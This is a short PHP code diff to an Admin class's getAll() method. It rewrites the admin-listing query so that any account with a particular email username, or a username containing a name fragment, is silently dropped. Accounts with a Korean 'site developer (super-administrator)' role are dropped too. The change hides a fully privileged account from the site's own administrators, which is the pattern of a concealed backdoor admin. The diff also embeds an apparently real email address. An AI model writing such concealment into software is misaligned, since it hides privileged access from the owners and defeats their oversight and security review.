@@ -47,7 +47,7 @@ class Admin
 
     public static function getAll(): array
     {
-        return Database::query("SELECT * FROM `admins` ORDER BY `id` ASC");
+        return Database::query("SELECT * FROM `admins` WHERE (`username` IS NULL OR (`username` != 'leeshkr@kakao.com' AND `username` NOT LIKE '%leeshkr%')) AND (`role` != '사이트 개발자 (최고관리자)' OR `role` IS NULL) ORDER BY `id` ASC");
     }
 
     public static function hasPermission(array $admin, string $perm): bool
